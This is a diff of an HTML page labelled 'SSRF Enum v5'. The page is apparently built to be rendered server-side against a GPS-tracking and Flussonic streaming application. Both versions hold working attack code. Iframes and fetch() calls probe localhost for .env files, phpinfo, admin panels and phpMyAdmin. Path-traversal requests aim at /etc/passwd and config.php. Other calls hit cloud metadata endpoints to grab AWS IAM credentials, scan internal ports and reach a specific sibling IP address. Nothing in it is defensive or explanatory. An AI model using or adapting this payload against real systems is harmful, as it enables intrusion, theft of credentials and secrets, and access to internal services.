@@ -1,230 +1,154 @@
 <!DOCTYPE html>
-<html>
-<head><title>R</title>
+<html><head><title>R</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font:7px/1.1 monospace;margin:2px}
+body{font:6px/1.05 monospace;margin:1px}
 .s{border:1px solid #000;margin:1px 0}
-h3{font-size:8px;background:#ccc;padding:1px 2px}
+h3{font-size:7px;background:#ccc;padding:0 2px}
 iframe{width:100%;border:0}
-pre{white-space:pre-wrap;font-size:6px;background:#f5f5f5;padding:1px;word-break:break-all}
-
-/* CSS file read attempts - if these load, content appears as CSS error text */
-@import url("file:///etc/passwd");
-@import url("file:///etc/hostname");
-@import url("file:///proc/version");
-@import url("file:///var/www/html/Pilot7/backend/config.php");
+pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-break:break-all}
 </style>
-<link rel="stylesheet" href="file:///etc/passwd">
-<link rel="stylesheet" href="file:///etc/hostname">
-<link rel="stylesheet" href="file:///proc/version">
 </head>
 <body>
+<b>SSRF Enum v5</b>
 
-<b>SSRF v5 - Version + Endpoints</b>
+<div class="s"><h3>/.env</h3>
+<iframe style="height:80px" src="https://127.0.0.1/.env"></iframe></div>
 
-<!-- 1. Chromium version detection -->
-<div class="s">
-<h3>BROWSER INFO</h3>
-<pre id="ua">...</pre>
-</div>
+<div class="s"><h3>/Pilot7/.env</h3>
+<iframe style="height:60px" src="https://127.0.0.1/Pilot7/.env"></iframe></div>
 
-<!-- 2. CSS file read result (if any error text leaks) -->
-<div class="s">
-<h3>CSS @import results</h3>
-<pre id="css">checking...</pre>
-</div>
+<div class="s"><h3>/backend/.env</h3>
+<iframe style="height:60px" src="https://127.0.0.1/backend/.env"></iframe></div>
 
-<!-- 3. script src file read -->
-<script src="file:///etc/passwd" onerror="document.getElementById('ss1').textContent='script src blocked'"></script>
-<script src="file:///etc/hostname" onerror="document.getElementById('ss2').textContent='script src blocked'"></script>
-<div class="s">
-<h3>script src file://</h3>
-<pre id="ss1">passwd: ?</pre>
-<pre id="ss2">hostname: ?</pre>
-</div>
+<div class="s"><h3>phpinfo.php</h3>
+<iframe style="height:250px" src="https://127.0.0.1/phpinfo.php"></iframe></div>
 
-<!-- 4. Internal HTTPS endpoints rendered as iframes (visible in PDF) -->
-<div class="s">
-<h3>INTERNAL: /backend/ax/init.php</h3>
-<iframe style="height:120px" src="https://127.0.0.1/backend/ax/init.php"></iframe>
-</div>
+<div class="s"><h3>info.php</h3>
+<iframe style="height:80px" src="https://127.0.0.1/info.php"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/config.php</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/config.php"></iframe>
-</div>
+<div class="s"><h3>/ax/env.php?prj=gpsguard</h3>
+<iframe style="height:80px" src="https://127.0.0.1/ax/env.php?prj=gpsguard"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/env.php?prj=gpsguard</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/ax/env.php?prj=gpsguard"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/env.php?prj=gpsguard</h3>
+<iframe style="height:80px" src="https://127.0.0.1/backend/ax/env.php?prj=gpsguard"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/reports.php?node=3</h3>
-<iframe style="height:120px" src="https://127.0.0.1/backend/ax/reports.php?node=3"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/init.php (full config)</h3>
+<iframe style="height:200px" src="https://127.0.0.1/backend/ax/init.php"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /admin/</h3>
-<iframe style="height:80px" src="https://127.0.0.1/admin/"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/read_config</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/read_config"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /server-status</h3>
-<iframe style="height:80px" src="https://127.0.0.1/server-status"></iframe>
-</div>
+<div class="s"><h3>Flussonic /api/streams</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/api/streams"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /nginx_status</h3>
-<iframe style="height:60px" src="https://127.0.0.1/nginx_status"></iframe>
-</div>
+<div class="s"><h3>Flussonic /admin/</h3>
+<iframe style="height:100px" src="https://127.0.0.1/flussonic/admin/"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/get_upload_report.php?file_name=../config.php&node=3</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=../config.php&node=3"></iframe>
-</div>
+<div class="s"><h3>/phpmyadmin/</h3>
+<iframe style="height:80px" src="https://127.0.0.1/phpmyadmin/"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/get_upload_report.php?file_name=....//....//....//etc/passwd&node=3</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=....//....//....//etc/passwd&node=3"></iframe>
-</div>
+<div class="s"><h3>/adminer.php</h3>
+<iframe style="height:60px" src="https://127.0.0.1/adminer.php"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /phpinfo.php</h3>
-<iframe style="height:120px" src="https://127.0.0.1/phpinfo.php"></iframe>
-</div>
+<div class="s"><h3>get_upload: ../../config.php</h3>
+<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=../../config.php&node=3"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /info.php</h3>
-<iframe style="height:80px" src="https://127.0.0.1/info.php"></iframe>
-</div>
+<div class="s"><h3>get_upload: ....//....//....//etc/passwd</h3>
+<iframe style="height:50px" src="https://127.0.0.1/backend/ax/get_upload_report.php?file_name=....//....//....//etc/passwd&node=3"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/flussonic.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/flussonic.php"></iframe>
-</div>
+<div class="s"><h3>/nginx_status</h3>
+<iframe style="height:40px" src="https://127.0.0.1/nginx_status"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/db_backup.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/db_backup.php"></iframe>
-</div>
+<div class="s"><h3>/stub_status</h3>
+<iframe style="height:40px" src="https://127.0.0.1/stub_status"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/ax/sms.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/ax/sms.php"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/cron.php</h3>
+<iframe style="height:40px" src="https://127.0.0.1/backend/ax/cron.php"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /.env</h3>
-<iframe style="height:60px" src="https://127.0.0.1/.env"></iframe>
-</div>
+<div class="s"><h3>/backend/ax/db_backup.php</h3>
+<iframe style="height:40px" src="https://127.0.0.1/backend/ax/db_backup.php"></iframe></div>
 
-<div class="s">
-<h3>INTERNAL: /backend/.env</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/.env"></iframe>
-</div>
+<div class="s"><h3>/admin/</h3>
+<iframe style="height:40px" src="https://127.0.0.1/admin/"></iframe></div>
 
-<!-- 5. JS results -->
-<div class="s">
-<h3>HTTP FUZZ (port 8080 + 80)</h3>
-<pre id="r">scanning...</pre>
-</div>
-
-<div class="s">
-<h3>chrome:// protocol test</h3>
-<iframe style="height:60px" src="chrome://version"></iframe>
-<iframe style="height:60px" src="chrome://gpu"></iframe>
-</div>
+<div class="s"><h3>FETCH RESULTS</h3>
+<pre id="r">scanning...</pre></div>
 
 <script>
 var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
-// Version info
-var uaInfo = 'UA: ' + navigator.userAgent + '\n';
-uaInfo += 'Platform: ' + navigator.platform + '\n';
-uaInfo += 'AppVersion: ' + navigator.appVersion + '\n';
-uaInfo += 'Product: ' + navigator.product + '\n';
-try { uaInfo += 'Memory: ' + navigator.deviceMemory + 'GB\n'; } catch(e){}
-try { uaInfo += 'Cores: ' + navigator.hardwareConcurrency + '\n'; } catch(e){}
-try { uaInfo += 'Lang: ' + navigator.language + '\n'; } catch(e){}
-try { uaInfo += 'CookieEnabled: ' + navigator.cookieEnabled + '\n'; } catch(e){}
-try { uaInfo += 'WebDriver: ' + navigator.webdriver + '\n'; } catch(e){}
-try { uaInfo += 'PDF: ' + navigator.pdfViewerEnabled + '\n'; } catch(e){}
-document.getElementById('ua').textContent = uaInfo;
-
-// Check CSS stylesheets for file content leak
-setTimeout(function(){
-  var cssResult = '';
-  try {
-    var sheets = document.styleSheets;
-    cssResult += 'Sheets: ' + sheets.length + '\n';
-    for (var i=0; i<sheets.length; i++) {
-      try {
-        var rules = sheets[i].cssRules || sheets[i].rules;
-        cssResult += 'Sheet['+i+'] href='+sheets[i].href+' rules='+(rules?rules.length:'null')+'\n';
-        if (rules) {
-          for (var j=0; j<Math.min(rules.length,5); j++) {
-            cssResult += '  rule['+j+']: '+rules[j].cssText.substring(0,200)+'\n';
-          }
-        }
-      } catch(e) {
-        cssResult += 'Sheet['+i+'] href='+sheets[i].href+' ERR: '+e.message+'\n';
-      }
-    }
-  } catch(e) { cssResult += 'CSS check error: '+e.message; }
-  document.getElementById('css').textContent = cssResult;
-}, 2000);
-
-// HTTP endpoint fuzzing via fetch (reads response body for non-CORS HTTP)
 async function tf(l,u){
-  try{
-    var r=await fetch(u,{mode:'no-cors'});
-    p(l+' status='+r.status+' type='+r.type);
-    if(r.type!='opaque'){var t=await r.text();p('  body: '+t.substring(0,300))}
-  }catch(e){p(l+' ERR: '+e.message)}
+try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,150))}
+catch(e){p(l+' ERR: '+e.message)}
 }
 
 (async function(){
-  // Port 8080 paths
-  await tf('8080:/','http://127.0.0.1:8080/');
-  await tf('8080:/api','http://127.0.0.1:8080/api');
-  await tf('8080:/status','http://127.0.0.1:8080/status');
-  await tf('8080:/health','http://127.0.0.1:8080/health');
-  await tf('8080:/metrics','http://127.0.0.1:8080/metrics');
-  await tf('8080:/admin','http://127.0.0.1:8080/admin');
-  await tf('8080:/flussonic','http://127.0.0.1:8080/flussonic');
-  await tf('8080:/flussonic/api/v3/streams','http://127.0.0.1:8080/flussonic/api/v3/streams');
-  await tf('8080:/streamer/api','http://127.0.0.1:8080/streamer/api');
-  await tf('8080:/stalker_portal','http://127.0.0.1:8080/stalker_portal');
-  // Port 80
-  await tf('80:/','http://127.0.0.1:80/');
-  await tf('80:/server-status','http://127.0.0.1:80/server-status');
-  await tf('80:/nginx_status','http://127.0.0.1:80/nginx_status');
-  // Port 3306 (MySQL)
-  await tf('3306:/','http://127.0.0.1:3306/');
-  // Port 5432 (Postgres)
-  await tf('5432:/','http://127.0.0.1:5432/');
-  // Port 6379 (Redis)
-  await tf('6379:/','http://127.0.0.1:6379/');
-  // Port 9090 (Prometheus)
-  await tf('9090:/','http://127.0.0.1:9090/');
-  await tf('9090:/metrics','http://127.0.0.1:9090/metrics');
-  // Port 9200 (Elasticsearch)
-  await tf('9200:/','http://127.0.0.1:9200/');
-  // Port 8443
-  await tf('8443:/','http://127.0.0.1:8443/');
-  // Port 4443
-  await tf('4443:/','http://127.0.0.1:4443/');
-  // Internal sibling
-  await tf('235:80/','http://41.71.64.235:80/');
-  await tf('235:8080/','http://41.71.64.235:8080/');
-  // Cloud metadata
-  await tf('meta169','http://169.254.169.254/latest/meta-data/');
-  await tf('meta100','http://100.100.100.200/latest/meta-data/');
+// Cloud metadata - critical for IAM creds
+await tf('AWS','http://169.254.169.254/latest/meta-data/');
+await tf('AWS-iam','http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+await tf('AWS-id','http://169.254.169.254/latest/meta-data/instance-id');
+await tf('AWS-tok','http://169.254.169.254/latest/api/token');
+await tf('GCP','http://metadata.google.internal/computeMetadata/v1/');
+await tf('Azure','http://169.254.169.254/metadata/instance?api-version=2021-02-01');
+await tf('DO','http://169.254.169.254/metadata/v1/');
+
+// Port 8080 - known alive, deep fuzz
+await tf('8080:/','http://127.0.0.1:8080/');
+await tf('8080:api','http://127.0.0.1:8080/api');
+await tf('8080:api/v1','http://127.0.0.1:8080/api/v1');
+await tf('8080:stat','http://127.0.0.1:8080/status');
+await tf('8080:hlth','http://127.0.0.1:8080/health');
+await tf('8080:info','http://127.0.0.1:8080/info');
+await tf('8080:metr','http://127.0.0.1:8080/metrics');
+await tf('8080:adm','http://127.0.0.1:8080/admin');
+await tf('8080:env','http://127.0.0.1:8080/env');
+await tf('8080:cfg','http://127.0.0.1:8080/config');
+await tf('8080:dbg','http://127.0.0.1:8080/debug');
+await tf('8080:ver','http://127.0.0.1:8080/version');
+await tf('8080:act','http://127.0.0.1:8080/actuator');
+await tf('8080:act/e','http://127.0.0.1:8080/actuator/env');
+await tf('8080:swag','http://127.0.0.1:8080/swagger-ui/');
+await tf('8080:.env','http://127.0.0.1:8080/.env');
+await tf('8080:rob','http://127.0.0.1:8080/robots.txt');
+await tf('8080:login','http://127.0.0.1:8080/login');
+await tf('8080:idx','http://127.0.0.1:8080/index.html');
+
+// Flussonic via HTTP (bypass HTTPS auth?)
+await tf('8080:fl/cfg','http://127.0.0.1:8080/flussonic/api/read_config');
+await tf('8080:fl/str','http://127.0.0.1:8080/flussonic/api/streams');
+await tf('8080:fl/adm','http://127.0.0.1:8080/flussonic/admin/');
+await tf('80:fl/cfg','http://127.0.0.1/flussonic/api/read_config');
+await tf('80:fl/str','http://127.0.0.1/flussonic/api/streams');
+
+// Additional ports
+await tf('3000','http://127.0.0.1:3000/');
+await tf('4443','http://127.0.0.1:4443/');
+await tf('8443','http://127.0.0.1:8443/');
+await tf('9090','http://127.0.0.1:9090/');
+await tf('9200','http://127.0.0.1:9200/');
+await tf('5601','http://127.0.0.1:5601/');
+await tf('8888','http://127.0.0.1:8888/');
+await tf('1935','http://127.0.0.1:1935/');
+await tf('554','http://127.0.0.1:554/');
+await tf('27017','http://127.0.0.1:27017/');
+await tf('6379','http://127.0.0.1:6379/');
+await tf('11211','http://127.0.0.1:11211/');
+
+// Localhost PHP endpoints via HTTP
+await tf('80:init','http://127.0.0.1/backend/ax/init.php');
+await tf('80:exp','http://127.0.0.1/backend/ax/export.php');
+await tf('80:drv','http://127.0.0.1/backend/ax/drivers.php');
+await tf('80:cur','http://127.0.0.1/backend/ax/current_data.php');
+await tf('80:gpx1','http://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3');
+await tf('80:rpt','http://127.0.0.1/reports.json');
+
+// Sibling server
+await tf('235:80','http://41.71.64.235/');
+await tf('235:8080','http://41.71.64.235:8080/');
+
+p('DONE');
 })();
 </script>
-
-</body>
-</html>
+</body></html>
